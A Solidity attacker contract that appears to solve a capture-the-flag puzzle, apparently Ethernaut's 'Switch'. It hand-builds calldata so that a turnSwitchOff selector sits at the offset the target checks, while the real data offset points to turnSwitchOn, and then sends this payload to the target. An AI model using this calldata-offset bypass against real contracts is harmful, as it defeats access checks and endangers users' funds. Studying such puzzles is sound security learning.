// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SwitchAttacker2 {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() public {
        // Craft the calldata manually
        // flipSwitch function selector: 0x30c13ade
        // We need to place turnSwitchOff selector at position 68
        // But point the actual data offset to call turnSwitchOn
        
        bytes memory callData = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        
        (bool success,) = target.call(callData);
        require(success, "Attack failed");
    }
}